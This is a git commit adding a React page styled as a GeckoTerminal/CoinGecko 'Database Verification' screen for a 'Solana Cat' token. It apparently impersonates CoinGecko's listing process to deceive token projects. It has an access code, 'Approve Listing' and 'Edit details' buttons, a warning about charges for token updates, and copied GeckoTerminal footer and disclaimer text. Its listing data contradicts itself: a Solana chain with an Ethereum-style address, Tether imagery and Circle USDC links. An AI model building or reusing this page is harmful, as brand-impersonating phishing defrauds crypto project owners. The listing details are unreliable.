d622842882c1c04e9417bc00bde7da5dbc03076d
APPLE <apple@Yelmi.local>
2024-07-15 00:04:22 +0100

    first commit

---
+++ src/App.js
@@ -0,0 +1,12 @@
+import Startpage from './Startpage';
+import './App.css';
+
+function App() {
+  return (
+    <div className="">
+<Startpage/>
+    </div>
+  );
+}
+
+export default App;
---
+++ src/Startpage.js
@@ -0,0 +1,153 @@
+import React from 'react'
+import { IoConstructSharp } from "react-icons/io5";
+
+const Startpage = () => {
+  return (
+    <div className='bg-[#111827] w-full'>
+     <nav className=' text-gray-300'>
+  
+  <div className=' p-3 pt-4 flex app items-center justify-between'>
+  <img src="../1x/Asset 7.png" alt="" className='md:w-[15%] w-[50%]'/>
+  
+
+  <div className='md:flex hidden justify-between w-[20%] mr-10'>
+    <a href="https://apiguide.geckoterminal.com/" >
+    <p className='p-2 border'>Public API Docs</p>
+    </a>
+    <a href="https://forms.gle/auEd1RUveZFXLcpv9" >
+    <p className='p-2 border border-gray-300'>Give Feedback</p>
+    </a>
+  </div>
+  </div>
+     </nav>
+
+<div className=' nnn px-3 text-gray-300 py-5'>
+<section className='md:text-xl text-sm app font-semi-bold'>
+<p>DATABASE VERIFICATION</p>
+</section>
+<p className='app md:text-sm text-xs text-gray-300 p-1'>
+  Verify your project Details directly form the CoinGecko Database
+</p>
+<div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
+<img className='md:w-[2%] w-[7%]' src="https://www.geckoterminal.com/_next/image?url=https%3A%2F%2Fcoin-images.coingecko.com%2Fcoins%2Fimages%2F39032%2Fsmall%2Ftcat-logo-main.png%3F1720027380&w=64&q=75" alt="" />
+<p>SOLANA CAT</p>
+</div>
+
+<div className='p-2 app bg-[#000000] mt-2 md:mt-5'>
+<p className='text-[#b79761]'>_database_access_code: <span className='text-[#CFADE8]'>1a93b6a9-7b9d-440a-8cfe-0966616399z9</span></p>
+</div>
+<div className='md:grid md:grid-cols-2 md:gap-2 '>
+
+<div className=' p-2 app overflow-scroll bg-[#000000] mt-2 lll'>
+<p className='text-[#C0E48B]'> 
+Database_file
+</p>
+<p className='mt-3 text-[#FD5370]'>project_data:[
+  <div className='my-1 pl-2 text-[#b79761]'>
+  <p>"listing_id": <span className='text-[#CFADE8]'>"CL0907240005",</span></p>
+  <p>"type": <span className='text-[#CFADE8]'>"token",</span></p>
+  <p className='mt-1 text-[#FD5370]'>"attributes": <span className='text-[#CFADE8]'>[
+    <div className='text-[#b79761] py-1'>
+    <p>"name": <span className='text-[#CFADE8]'>"Solana_Cat",</span></p>
+    <p>"symbol": <span className='text-[#CFADE8]'>"SOLC",</span></p>
+    <p>"chain": <span className='text-[#CFADE8]'>"solana",</span></p>
+    <p>"contract_address": <span className='text-[#CFADE8]'>"0xdac17f958d2ee523a2206206994597c13d831ec7",</span></p>
+    <p>"decmials": <span className='text-[#CFADE8]'>"6",</span></p>
+    <p>"image_url": <span className='text-[#CFADE8]'>"https://assets.coingecko.com/coins/images/325/small/Tether.png?1696501661",</span></p>
+    <p>"total_supply": <span className='text-[#CFADE8]'>"10000000000",</span></p>
+    <p>"liquidity": <span className='text-[#CFADE8]'>"10000000000",</span></p>
+    <p>"volume_24h": <span className='text-[#CFADE8]'>"10000000000",</span></p>
+    <p>"price_usd": <span className='text-[#CFADE8]'>"0.99720157",</span></p>
+    </div>
+    ],</span></p>
+
+  </div>
+  </p>
+</div>
+
+<div className=' p-2 md:pt-2 pt-0 overflow-scroll app bg-[#000000] md:mt-2 lll'>
+<p className='text-[#FD5370]'>"description": <span className='text-[#CFADE8]'>[
+  <div className='my-1 pl-2 text-[#b79761]'>
+  <p>"en": <span className='text-[#CFADE8]'>"solana_cat",</span></p>
+  <p>"de": <span className='text-[#CFADE8]'>"token",</span></p>
+  </div>
+ ],</span>
+  <p className='mt-1 text-[#FD5370]'>"links": <span className='text-[#CFADE8]'>[
+    <div className='text-[#b79761] py-1'>
+    <p>"website": <span className='text-[#CFADE8]'>"https://www.circle.com/en/usdc",</span></p>
+    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://www.circle.com/en/usdc",</span></p>
+    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://bscscan.com/token/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",</span></p>
+    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/invite/buildoncircle",</span></p>
+    <p>"twitter_url": <span className='text-[#CFADE8]'>"circle",</span></p>
+    <p>"exchange_url": <span className='text-[#CFADE8]'>"mexc.com/solanacat",</span></p>
+   
+    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/ton/pools/EQDliYkW-Ryo0CEPpThzxbHT97Niu9BOHLwidsofCj6Qv870",</span></p>
+    <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"database",</span></p>
+    </div>
+      ],</span></p> ].</p>
+      
+  
+
+  <div className='flex justify-center'>
+<img className='w-[60%]' src="../1x/Asset 4.png" alt="" />
+</div>
+</div>
+</div>
+
+<div className='p-2 text-xs md:text- app bg-[#000000] mt-5'>
+<p>
+Please ensure that all details are accurately implemented to avoid additional charges for token updates by <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a>. Once verified, approve the publishing. It takes approximately 1-3 hours for the listing to be fully published on our official <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a> platform.
+</p>
+</div>
+
+<div className='mt-3 app flex justify-between'>
+<button className='px-4 py-2 bg-[#66BB6A]'>Approve Listing</button>
+<button className='px-4 py-2 bg-[#FD5370] flex gap-2 items-center'><IoConstructSharp className='text-black text-lg'/>Edit details </button>
+</div>
+
+
+</div>
+
+<div className='nnn mt-20 '>
+  <footer className='app text-gray-400'>
+    <div className='md:flex p-5  '>
+<section className='md:w-[60%] app '>
+<img src="../1x/Asset 7.png" alt="" className='w-[30%]'/>
+<p className='mt-5 text-xs'>GeckoTerminal is the most comprehensive real-time DEX tracker, 
+  built by the team behind CoinGecko. Monitor crypto prices, volume, transactions,
+   liquidity, and more on decentralized exchanges across all blockchains.</p>
+</section>
+<section className='md:w-[20%]'>
+  <p className='font-bold mb-3 md:mt-0 mt-5'>Resources</p>
+  <p className='hover:text-gray-100'><a href="https://www.geckoterminal.com/ethwars">ETH Wars</a></p>
+</section>
+<section className='md:w-[20%]'>
+<p className='font-bold mb-3 md:mt-0 mt-5'>About</p>
+<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/about-us">About Us</a></p>
+<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/disclaimer">Disclaimer</a></p>
+<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/terms-conditions">Terms and Conditions</a></p>
+<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/privacy-policy">Privacy Policy</a></p>
+<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/ad-policy">Ad Policy</a></p>
+</section>
+    </div>
+
+    <div className='nnn md:block hidden p-5 text-xs'>
+<p><a href="https://www.geckoterminal.com/disclaimer" className='underline text-sm text-white'>IMPORTANT DISCLAIMER:</a> All content provided herein our website, hyperlinked sites, 
+  associated applications, forums, blogs, social media accounts and other platforms (“Site”) is for your general information only, 
+  procured primarily from third party sources. We make no warranties of any kind in relation to our content and services
+   (such as token swap functionalities), including but not limited to accuracy, security and updatedness. No part of the 
+   content and services that we provide constitutes financial advice, legal advice or any other form of advice meant for your
+    specific reliance for any purpose, nor any dealing in (or promotion of) securities for which a license is required 
+    from the Monetary Authority of Singapore. Any use or reliance on our content and services is solely at your own risk and 
+    discretion. You should conduct your own research, review, analyze and verify our content and services before relying on or using them. Trading is a highly risky activity that can lead to major losses, 
+    please therefore consult your financial advisor before making any decision. 
+  No content on our Site is meant to be a solicitation or offer.</p>
+    </div>
+  </footer>
+</div>
+    
+    </div>
+  )
+}
+
+export default Startpage
